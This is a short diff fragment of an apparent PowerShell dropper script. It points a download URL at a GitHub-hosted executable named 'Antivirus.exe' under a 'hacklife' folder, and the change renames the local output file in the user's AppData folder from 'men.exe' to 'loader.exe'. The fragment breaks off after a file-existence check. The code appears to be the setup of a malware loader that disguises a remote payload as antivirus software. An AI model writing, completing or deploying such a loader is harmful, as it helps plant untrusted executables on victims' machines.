@@ -1,5 +1,5 @@
 $url = "https://github.com/43a1723/test/raw/main/Extras/hacklife/Antivirus.exe"
-$output = "$env:localappdata\men.exe"
+$output = "$env:localappdata\loader.exe"
 
 if (Test-Path -Path $output) {
     Write-Host "hello"
